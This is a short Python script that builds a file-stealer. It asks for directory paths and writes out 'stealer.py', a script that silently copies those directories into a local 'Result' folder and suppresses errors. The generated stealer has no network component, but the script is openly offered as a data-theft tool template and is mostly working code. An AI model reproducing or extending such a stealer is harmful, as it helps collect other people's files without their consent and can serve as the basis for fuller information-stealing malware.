file_target = []
count = 0
print("[*] Write the '\exit' if you want break the cicle")
while True:
	select = input("[%d] Directory: " % count)
	if select != '\\exit':
		file_target.append(select)
		count += 1
	else: break

with open("stealer.py",'w') as stealer:
	stealer.write('''
from os import getcwd, mkdir
from os.path import basename
from shutil import copytree

directory = getcwd()+"/Result/"
try:
	mkdir(directory)
except FileExistsError:
	pass

file_target = ''' + str(file_target) + '''
for target in file_target:
	under = directory + basename(target)
	
	try:
		copytree(target, under)
	except:
		pass
''')
	print("[+] File 'stealer.py' created")
